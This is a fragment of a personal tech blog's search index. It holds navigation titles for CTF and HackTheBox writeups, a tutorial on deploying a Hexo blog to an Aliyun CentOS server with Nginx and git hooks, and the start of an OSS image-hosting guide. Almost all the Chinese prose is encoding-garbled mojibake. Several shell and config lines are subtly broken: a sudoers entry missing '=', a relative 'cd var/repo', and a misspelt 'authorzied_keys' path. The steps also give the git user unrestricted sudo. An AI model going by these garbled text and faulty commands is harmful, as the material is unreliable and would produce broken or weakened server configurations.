<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTFâ€”SSRF</a></li>
<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTFâ€”å‘½ä»¤æ‰§è¡Œ</a></li>
<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTFâ€”æ–‡ä»¶ä¸Šä¼ </a></li>
<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTFâ€”æ–‡ä»¶åŒ…å«</a></li>
<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTFâ€”Python</a></li>
<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTFâ€”NodeJS</a></li>
<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTFâ€”Rubyå’ŒGo</a></li>
<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTFâ€”æ¸—é€æµ‹è¯•</a></li>
<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020ç”µä¿¡å¤©ç¿¼æ¯CTFâ€”APITest</a></li>
<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">æ˜Ÿç›Ÿ6æœˆAWD Web+Pwn</a></li>
<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020ä¸ƒæœˆèµ› Web</a></li>
<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020ç¬¬äº”ç©ºé—´CTF Web</a></li>
<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">é¦–å±Šé’“é±¼åŸæ¯CTF</a></li>
<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTFå…«æœˆèµ›</a></li>
</ul>
<h1 id="é¶æœºç³»åˆ—"><strong>é¶æœºç³»åˆ—</strong></h1>
<h2 id="HackTheBox">HackTheBox</h2>
<ul>
<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
<li><a href="/Target_drone/HackTheBox/18.HTB-Admirer-walkthrough">HTB::Admirer</a></li>
</ul>
<h2 id="VulnHub">VulnHub</h2>
<ul>
<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
</ul>
<h1 id="ä»£ç å®¡è®¡"><strong>ä»£ç å®¡è®¡</strong></h1>
<h2 id="PHPä»£ç å®¡è®¡">PHPä»£ç å®¡è®¡</h2>
<ul>
<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day1</a></li>
<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day2</a></li>
<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day3</a></li>
<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day4</a></li>
<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day5</a></li>
<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHPä»£ç å®¡è®¡å¤ç°â€”yixuncms</a></li>
<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHPä»£ç å®¡è®¡å¤ç°â€”chinaz</a></li>
<li><a href="/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95">CVE-2020-15148 Yii2ååºåˆ—åŒ–</a></li>
</ul>
<h1 id="æµé‡åˆ†æ"><strong>æµé‡åˆ†æ</strong></h1>
<ul>
<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Broè¯­æ³•å­¦ä¹ ä¹‹åŸºç¡€çŸ¥è¯†</a></li>
</ul>
<h1 id="æœºå™¨å­¦ä¹ "><strong>æœºå™¨å­¦ä¹ </strong></h1>
<h2 id="åŸºç¡€å­¦ä¹ ">åŸºç¡€å­¦ä¹ </h2>
<ul>
<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™ï¼ˆè½¬ï¼‰</a></li>
</ul>
<h1 id="Python"><strong>Python</strong></h1>
<h2 id="Pythonç¼–ç¨‹">Pythonç¼–ç¨‹</h2>
<ul>
<li>
<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Pythonå‡½æ•°çš„å‚æ•°</a></p>
</li>
<li>
<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Pythonå‡½æ•°å¼ç¼–ç¨‹ä¹‹é«˜é˜¶å‡½æ•°</a></p>
</li>
<li>
<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Pythonå‡½æ•°å¼ç¼–ç¨‹-é—­åŒ…</a></p>
</li>
<li>
<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Pythonå‡½æ•°å¼ç¼–ç¨‹-è£…é¥°å™¨</a></p>
</li>
<li>
<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Pythoné¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ä¹‹slotsã€@propertyå’Œå¤šé‡ç»§æ‰¿</a></p>
</li>
<li>
<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIOç¼–ç¨‹</a></p>
</li>
</ul>
<h1 id="Java"><strong>Java</strong></h1>
<h2 id="Javaç¼–ç¨‹">Javaç¼–ç¨‹</h2>
<ul>
<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">JavaåŸºç¡€å­¦ä¹ ä¹‹JDKã€JREã€JVM</a></li>
<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">JavaåŸºç¡€å­¦ä¹ ä¹‹æ ¸å¿ƒç±»</a></li>
<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">JavaåŸºç¡€å­¦ä¹ ä¹‹é¢å‘å¯¹è±¡åŸºç¡€</a></li>
<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">JavaåŸºç¡€å­¦ä¹ ä¹‹å¼‚å¸¸å¤„ç†</a></li>
</ul>
<h1 id="ç®—æ³•"><strong>ç®—æ³•</strong></h1>
<h2 id="Leetcode">Leetcode</h2>
<ul>
<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
</ul>
<h1 id="éšç¬”"><strong>éšç¬”</strong></h1>
<h2 id="ç»éªŒ">ç»éªŒ</h2>
<ul>
<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">ä»0åˆ°100åˆ†çš„è·¯ç¨‹â€”â€”å†™åœ¨2019å¹´çš„æœ€åä¸€å¤©</a></li>
</ul>
<h2 id="æŠ€æœ¯">æŠ€æœ¯</h2>
<ul>
<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">é˜¿é‡Œäº‘Centos7-Ngnixéƒ¨ç½²Hexo</a></li>
<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">é˜¿é‡Œäº‘OSS-PicGoæ­å»ºMarkdownå›¾åºŠ</a></li>
<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexoæ¸²æŸ“LaTeXæ•°å­¦å…¬å¼</a></li>
<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>é˜¿é‡Œäº‘Centos7+Ngnixéƒ¨ç½²Hexo</title>
    <url>/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo/</url>
    <content><![CDATA[<h1 id="é˜¿é‡Œäº‘Centos7-Ngnixéƒ¨ç½²Hexo">é˜¿é‡Œäº‘Centos7+Ngnixéƒ¨ç½²Hexo</h1>
<p>ä¹‹å‰ä¸€ç›´æŠŠhexoéƒ¨ç½²åœ¨GitHub Pageä¸Šï¼Œç¼ºç‚¹å°±æ˜¯è®¿é—®çš„é€Ÿåº¦æ…¢ï¼Œæœ‰æ—¶å€™ç”šè‡³åŠ è½½ä¸å‡ºæ¥ï¼Œåˆšå¥½ä¹‹å‰ä¹°çš„é˜¿é‡Œäº‘ECSä¹Ÿè½ç°äº†ï¼Œé¡ºæ‰‹æŠŠhexoéƒ¨ç½²åœ¨é˜¿é‡Œäº‘ä¸Šï¼Œå†é¡ºæ‰‹è®°å½•ä¸€ä¸‹éƒ¨ç½²è¿‡ç¨‹ã€‚</p>
<h3 id="éƒ¨ç½²ç¯å¢ƒ">éƒ¨ç½²ç¯å¢ƒ</h3>
<ul>
<li>æœ¬åœ°ç¯å¢ƒï¼š
<ul>
<li>Window10ï¼ˆ64bitï¼‰</li>
<li>Git</li>
<li>NodeJS</li>
<li>Hexo</li>
</ul>
</li>
<li>äº‘ä¸»æœºç¯å¢ƒ
<ul>
<li>Centos7</li>
<li>Nginx</li>
</ul>
</li>
<li>å…¶ä»–
<ul>
<li>å®å¡”é¢æ¿</li>
</ul>
</li>
</ul>
<h3 id="å¼€å§‹éƒ¨ç½²">å¼€å§‹éƒ¨ç½²</h3>
<h4 id="ç”Ÿæˆsshå…¬é’¥">ç”Ÿæˆsshå…¬é’¥</h4>
<blockquote>
<p>å¦‚æœæœ¬æœºå·²æœ‰<code>id_rsa.pub</code>æ–‡ä»¶ï¼Œæ­¤æ­¥éª¤å¯è·³è¿‡</p>
</blockquote>
<p>åœ¨Win10æ¡Œé¢å³å‡»ï¼Œç‚¹å‡»Git Bash Hereæ‰“å¼€å‘½ä»¤è¡Œç»ˆç«¯ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ˆç›´æ¥æŒ‰ä¸‰æ¬¡å›è½¦ç”Ÿæˆå¯†é’¥ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆçš„æ–‡ä»¶é»˜è®¤åœ¨<code>C:/ç”¨æˆ·/æœ¬æœºç”¨æˆ·å/.ssh/</code>è·¯å¾„ä¸‹ã€‚</p>
<h4 id="Centosæ­å»ºç¯å¢ƒ">Centosæ­å»ºç¯å¢ƒ</h4>
<h5 id="å®‰è£…Git">å®‰è£…Git</h5>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install git</span><br></pre></td></tr></table></figure>
<h5 id="åˆ›å»ºGitè´¦æˆ·">åˆ›å»ºGitè´¦æˆ·</h5>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adduser git</span><br></pre></td></tr></table></figure>
<h5 id="æ·»åŠ è´¦æˆ·æƒé™">æ·»åŠ è´¦æˆ·æƒé™</h5>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°ä¸‹é¢è¿™ä¸€è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Allow root to run any commands anywhere</span></span><br><span class="line">root    ALL=(ALL)     ALL</span><br></pre></td></tr></table></figure>
<p>ç´§æ¥ç€æ·»åŠ ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git     ALL(ALL)      ALL</span><br></pre></td></tr></table></figure>
<h5 id="è®¾ç½®Gitè´¦æˆ·å¯†ç ">è®¾ç½®Gitè´¦æˆ·å¯†ç </h5>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure>
<h5 id="å¤åˆ¶å…¬é’¥">å¤åˆ¶å…¬é’¥</h5>
<p>åˆ‡æ¢è‡³gitç”¨æˆ·ï¼Œåˆ›å»º<code>./ssh</code>æ–‡ä»¶å¤¹å’Œ``~/.ssh/authorized_keys `æ–‡ä»¶ï¼Œå¹¶ç»™æƒé™ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">mkdir ~/.ssh</span><br><span class="line">vim ~/.ssh/authorized_keys</span><br><span class="line"><span class="meta">#</span><span class="bash"> ç„¶åå°†win10ä¸­ç”Ÿæˆçš„id_rsa.pubæ–‡ä»¶ä¸­çš„å…¬é’¥å¤åˆ¶åˆ°authorized_keys</span></span><br><span class="line">chmod 600 /home/git/.ssh/authorzied_keys</span><br><span class="line">chmod 700 /home/git/.ssh</span><br></pre></td></tr></table></figure>
<blockquote>
<p>åœ¨æœ¬åœ°Gitç»ˆç«¯ä¸­æµ‹è¯•æ˜¯å¦èƒ½å…å¯†ç™»å½•gitï¼Œå…¶ä¸­SERVERä¸ºå¡«å†™è‡ªå·±çš„äº‘ä¸»æœºIPï¼Œæ‰§è¡Œè¾“å…¥yesåä¸ç”¨å¯†ç å°±è¯´æ˜å¥½äº†</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -v git@SERVER</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="åˆ›å»ºæœ¬åœ°ä»“åº“å’Œç½‘ç«™æ ¹ç›®å½•">åˆ›å»ºæœ¬åœ°ä»“åº“å’Œç½‘ç«™æ ¹ç›®å½•</h5>
<p>é¦–å…ˆåˆ›å»ºç›®å½•å¹¶ç»™æƒé™ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">repoä½œä¸ºä¸ºGitä»“åº“ç›®å½•</span></span><br><span class="line">mkdir /var/repo</span><br><span class="line">chown -R git:git /var/repo</span><br><span class="line">chmod -R 755 /var/repo</span><br><span class="line"><span class="meta">#</span><span class="bash">hexoä½œä¸ºç½‘ç«™æ ¹ç›®å½•</span></span><br><span class="line">mkdir /var/www/hexo</span><br><span class="line">chown -R git:git /var/www/hexo</span><br><span class="line">chmod -R 755 /var/www/hexo</span><br></pre></td></tr></table></figure>
<p>ç„¶ååˆ›å»ºä¸€ä¸ªGitä»“åº“ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd var/repo</span><br><span class="line">git init --bare hexoBlog.git</span><br></pre></td></tr></table></figure>
<h5 id="è‡ªåŠ¨éƒ¨ç½²">è‡ªåŠ¨éƒ¨ç½²</h5>
<p>åœ¨ <code>/var/repo/hexoBlog.git</code>ä¸‹ï¼Œæœ‰ä¸€ä¸ªè‡ªåŠ¨ç”Ÿæˆçš„<code>hooks</code>æ–‡ä»¶å¤¹ã€‚æˆ‘ä»¬éœ€è¦åœ¨é‡Œè¾¹æ–°å»ºä¸€ä¸ªæ–°çš„é’©å­æ–‡ä»¶<code>post-receive</code>ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /var/repo/hexoBlog.git/hooks/post-receive</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ ä¸€ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">git --work-tree=/var/www/hexo --git-dir=/var/repo/hexoBlog.git checkout -f</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹æ–‡ä»¶æƒé™ï¼Œä½¿å¾—å…¶å¯æ‰§è¡Œï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown -R git:git /var/repo/hexoBlog.git/hooks/post-receive</span><br><span class="line">chmod +x /var/repo/hexoBlog.git/hooks/post-receive</span><br></pre></td></tr></table></figure>
<h4 id="Centosé…ç½®Nginx">Centosé…ç½®Nginx</h4>
<p>ä¸ºäº†é€‚åˆå°ç™½å®‰è£…éƒ¨ç½²å’ŒåæœŸç½‘ç«™æœåŠ¡å™¨çš„æ‰©å±•æ€§ï¼Œé€‰ç”¨å®å¡”é¢æ¿æ¥ä¸€é”®éƒ¨ç½²Nginxã€‚å®å¡”é¢æ¿çš„å®‰è£…å’Œä½¿ç”¨å¯ä»¥æŸ¥çœ‹<a href="http://www.bt.cn/bbs">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p>
<p>Nginxéƒ¨ç½²æˆåŠŸåå°±å¯ä»¥åˆ›å»ºç½‘ç«™äº†ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191024132801.png" alt=""></p>
<blockquote>
<p>æ²¡æœ‰åŸŸåçš„å¯ä»¥å¡«å†™IPåœ°å€ã€‚</p>
</blockquote>
<p><strong>æ³¨æ„ï¼šæ ¹ç›®å½•çš„è·¯å¾„å¿…é¡»æ˜¯ä½ ä¸Šä¸€æ­¥åœ¨äº‘æœåŠ¡å™¨ä¸Šåˆ›å»ºçš„ç½‘ç«™ç›®å½•ã€‚</strong></p>
<h3 id="æœ¬åœ°Hexoé…ç½®">æœ¬åœ°Hexoé…ç½®</h3>
<p>é…ç½®_config.yml,å®Œæˆè‡ªåŠ¨åŒ–éƒ¨ç½²ã€‚</p>
<p>æ‰“å¼€blogæ–‡ä»¶å¤¹ï¼Œç¼–è¾‘_config.ymlï¼Œæ‰¾åˆ°deployï¼š</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">deploy:</span></span><br><span class="line">  <span class="symbol">type:</span> git</span><br><span class="line">  <span class="comment">#serveræ”¹ä¸ºä½ çš„æœåŠ¡IPåœ°å€æˆ–è§£æåçš„åŸŸå</span></span><br><span class="line">  <span class="comment">#ä¾‹å¦‚æˆ‘æ”¹ä¸ºrepo: git<span class="doctag">@ali</span>6.cn:/var/repo/blog.git</span></span><br><span class="line">  <span class="symbol">repo:</span> git@server<span class="symbol">:/var/repo/hexoBlog</span>.git</span><br><span class="line">  <span class="symbol">branch:</span> master</span><br></pre></td></tr></table></figure>
<p>å†æ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>
<p>ä¸å‡ºé”™æ˜¾ç»¿è¯´æ˜å®Œæˆï¼Œæ‰“å¼€æµè§ˆå™¨è¾“å…¥ä½ çš„åŸŸåæˆ–ipåœ°å€å°±å¯ä»¥çœ‹åˆ°ä½ éƒ¨ç½²çš„Hexoåšå®¢äº†ã€‚</p>
]]></content>
      <categories>
        <category>æŠ€æœ¯éšç¬”</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>é˜¿é‡Œäº‘OSS+PicGoæ­å»ºMarkdownå›¾åºŠ</title>
    <url>/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h1 id="é˜¿é‡Œäº‘OSS-PicGoæ­å»ºMarkdownå›¾åºŠ">é˜¿é‡Œäº‘OSS+PicGoæ­å»ºMarkdownå›¾åºŠ</h1>
<p>ç”¨ä¸€ä¸ªå›¾åºŠå´©ä¸€ä¸ªï¼Œå®åœ¨æ˜¯ä¸èƒ½å¿äº†ï¼Œä¸€æ€’ä¹‹ä¸‹å†³å®šç”¨é˜¿é‡Œäº‘OSSæ¥æ­å»ºä¸€ä¸ªå›¾åºŠï¼Œç¨³å®šåˆæ–¹ä¾¿~</p>
<p>æ­¥éª¤ï¼š</p>
<ol>
<li>è´­ä¹°<code>é˜¿é‡Œäº‘OSS</code>ï¼Œ40Gå­˜å‚¨ç©ºé—´9å…ƒ/å¹´ï¼ˆæµé‡è´¹ç”¨å¦ç®—ï¼‰</li>
<li>åˆ›å»ºOSSä¸“ç”¨<code>ç”¨æˆ·</code>ï¼Œä¸“é—¨ç”¨äºè®¿é—®OSSï¼Œæ³¨æ„ä¿å­˜<code>AccessKey</code>å’Œ<code>AccessKeySecret</code></li>
<li>ä¸‹è½½é˜¿é‡Œå®˜æ–¹çš„<code>OSS Browser</code>ç®¡ç†å®¢æˆ·ç«¯ï¼Œå¹¶é…ç½®è¿æ¥ä¿¡æ¯</li>
<li>åˆ›å»ºBucketï¼Œæ³¨æ„æƒé™è®¾ç½®ä¸º<code>å…¬å…±è¯»</code></li>
<li>åœ¨<code>GitHub</code>ä¸‹è½½<code>PicGo</code>å®¢æˆ·ç«¯å¹¶å®‰è£…é…ç½®</li>
</ol>
<h2 id="è´­ä¹°é˜¿é‡Œäº‘OSS">è´­ä¹°é˜¿é‡Œäº‘OSS</h2>
<p>ä»·æ ¼ï¼š</p>
<blockquote>
<p>40G 9å…ƒ/å¹´</p>
<p>100G 99å…ƒ/å¹´</p>
<p>500G 486å…ƒ/å¹´</p>
<p>1T 999å…ƒ/å¹´</p>
</blockquote>
<p>åˆ°é˜¿é‡Œäº‘å®˜ç½‘æ‰¾OSSå…¥å£å³å¯ï¼š</p>
<p><a href="https://www.aliyun.com/product/oss?spm=5176.12825654.h2v3icoap.36.7b652c4aagSnXx&amp;aly_as=7HZ6xxr8">https://www.aliyun.com/product/oss?spm=5176.12825654.h2v3icoap.36.7b652c4aagSnXx&amp;aly_as=7HZ6xxr8</a></p>
<h2 id="åˆ›å»ºä¸“ç”¨ç”¨æˆ·ï¼ˆå¯é€‰ï¼‰">åˆ›å»ºä¸“ç”¨ç”¨æˆ·ï¼ˆå¯é€‰ï¼‰</h2>
<p>è¿›å…¥æ§åˆ¶å°åï¼Œé¼ æ ‡æ‚¬æµ®åœ¨å³ä¸Šè§’çš„ç”¨æˆ·å¤´åƒï¼Œé€‰æ‹©<code>è®¿é—®æ§åˆ¶</code></p>
<p>ç„¶ååœ¨å·¦ä¾§ï¼šäººå‘˜ç®¡ç†-&gt;ç”¨æˆ·ï¼šæ–°å»ºç”¨æˆ·</p>
<p>è¾“å…¥<code>ç™»å½•åç§°</code>å’Œ<code>æ˜¾ç¤ºåç§°</code>ï¼Œç‚¹å‡»<code>ç¡®è®¤</code>æŒ‰é’®ï¼Œè¦æ±‚æ‰‹æœºéªŒè¯ç ã€‚</p>
<p>åˆ›å»ºæˆåŠŸåï¼Œç‚¹å‡»è¿”å›ï¼Œç„¶åå›åˆ°ç”¨æˆ·åˆ—è¡¨ã€‚</p>
<p>ç‚¹å‡»è¿›å…¥åˆšåˆšåˆ›å»ºçš„ç”¨æˆ·ï¼Œé€‰æ‹©<code>æƒé™ç®¡ç†</code>ï¼Œç‚¹å‡»<code>æ·»åŠ æƒé™</code>ï¼Œæœç´¢<code>AliyunOSSFullAccess</code>ï¼Œæ·»åŠ ï¼Œç¡®è®¤ã€‚</p>
